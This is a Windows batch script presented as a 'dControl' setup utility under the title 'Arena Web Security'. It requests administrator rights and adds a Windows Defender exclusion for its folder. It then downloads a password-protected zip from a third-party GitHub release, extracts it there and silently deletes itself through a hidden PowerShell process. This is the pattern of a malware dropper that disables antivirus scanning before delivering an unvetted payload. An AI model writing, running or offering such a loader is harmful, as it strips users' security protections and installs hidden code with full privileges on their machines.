@echo off
Title Arena Web Security
setlocal enabledelayedexpansion

:: Configuration
set "bat_dir=%~dp0"
set "folder=%bat_dir%dControl"
set "winrar_url=https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-624.exe"
set "winrar_installer=!folder!\WinRAR-free.exe"
set "dcontrol_url=https://github.com/uppermo0n/dcontrol/releases/download/v1.0/dControl.zip"
set "dcontrol_zip=!folder!\dControl.zip"
set "password=aws"

:: Header
echo =============================================
echo dControl Environment Setup
echo =============================================
echo.

:: Check admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [STEP] Requesting administrative privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~dpnx0\"' -Verb RunAs"
    exit /b
)

:: User confirmation

:: === WinRAR Detection and Installation ===
set "winrar_exe="

:: Try native 64-bit registry
for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
    set "winrar_exe=%%b"
)

:: Try WOW6432Node
if not defined winrar_exe (
    for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
        set "winrar_exe=%%b"
    )
)

:: Try legacy path from WinRAR key
if not defined winrar_exe (
    for /f "tokens=3*" %%a in ('reg query "HKLM\SOFTWARE\WinRAR" /v "Path" 2^>nul ^| find "REG_SZ"') do (
        set "winrar_exe=%%a\WinRAR.exe"
    )
)

:: If still not found, install WinRAR
if not defined winrar_exe (
    echo [STEP] Downloading latest WinRAR...
    powershell -Command "Invoke-WebRequest -Uri '%winrar_url%' -OutFile '!winrar_installer!'" >nul 2>&1

    echo [STEP] Installing WinRAR...
    start "" /wait "!winrar_installer!" /S
    timeout /t 10 /nobreak >nul
    del "!winrar_installer!" >nul

    :: Re-check registry after install
    for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
        set "winrar_exe=%%b"
    )
    if not defined winrar_exe (
        for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
            set "winrar_exe=%%b"
        )
    )
)

:: Fallback
if not defined winrar_exe (
    set "winrar_exe=%ProgramFiles%\WinRAR\WinRAR.exe"
)

:: Final verification
echo [INFO] Verifying WinRAR at: !winrar_exe!
if not exist !winrar_exe! (
    echo [ERROR] WinRAR not found at: !winrar_exe!
    echo [ACTION] Please install WinRAR manually and re-run this script.
    exit /b
)

:: === Step 1: Create dControl Folder ===
if not exist "!folder!\" (
    mkdir "!folder!"
    echo [SUCCESS] Created workspace: !folder!
) else (
    echo [INFO] Workspace already exists: !folder!
)

:: === Step 2: Add to Windows Defender Exclusion ===
echo [STEP] Adding Defender exclusion for: !folder!
powershell -Command "Try { Add-MpPreference -ExclusionPath '!folder!' -ErrorAction Stop; Write-Host 'Defender exclusion added.' } Catch { Write-Host 'Failed to add Defender exclusion. You may need to run as Administrator.' }"

:: === Step 3: Open Windows Security Application ===
echo [INFO] Opening Windows Security for review...
start windowsdefender://

:: === Step 4: Download dControl ZIP in the background ===
echo [STEP] Downloading dControl package in the background...
powershell -Command "Invoke-WebRequest -Uri '%dcontrol_url%' -OutFile '%dcontrol_zip%' -UseBasicParsing" >nul 2>&1
if exist "%dcontrol_zip%" (
    echo [SUCCESS] dControl package downloaded
) else (
    echo [ERROR] Failed to download dControl package
    exit /b
)

:: === Step 5: Wait for User Confirmation Before Extraction ===
echo.
set /p userInput="Do you want to continue with extraction? (Y/N): "
if /i not "%userInput%"=="Y" (
    echo [INFO] Installation aborted by user.
    exit /b
)

:: === Step 6: Extract dControl ZIP ===
echo [STEP] Extracting dControl package...
start "" /wait "!winrar_exe!" x -ibck -p"%password%" "%dcontrol_zip%" "!folder!\" >nul 2>&1

if %errorlevel% equ 0 (
    echo [SUCCESS] Extraction completed successfully
) else (
    echo [ERROR] Extraction failed with code %errorlevel%
    exit /b
)

:: Delete ZIP after extraction
del /f /q "%dcontrol_zip%"
echo [INFO] Deleted dControl ZIP file

:: Open dControl Portable folder
start explorer "!folder!"

:: Launch silent deletion in background (runs independently)
start "" powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 5; Remove-Item -LiteralPath '%~f0' -Force"

:: Close terminal immediately
exit
